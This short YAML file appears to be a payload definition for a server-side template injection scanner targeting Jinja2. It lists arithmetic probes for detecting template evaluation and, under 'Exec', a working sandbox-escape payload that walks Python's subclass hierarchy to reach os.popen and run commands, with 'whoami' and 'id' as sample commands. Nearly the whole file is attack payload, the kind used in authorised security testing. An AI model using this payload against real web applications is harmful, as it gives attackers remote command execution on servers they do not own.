name: Jinja2
contexts:
  - begin: "{{"
    end: "}}"
attackTechniques:
  - name: Render
    payloads:
      - "{{ FirstNum * SecondNum }}"
      - "{{ FirstNum + SecondNum }}"
  
  - name: Exec
    payloads:
      - "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen(Command).read() }}"
    commands:
      - "whoami"
      - "id"
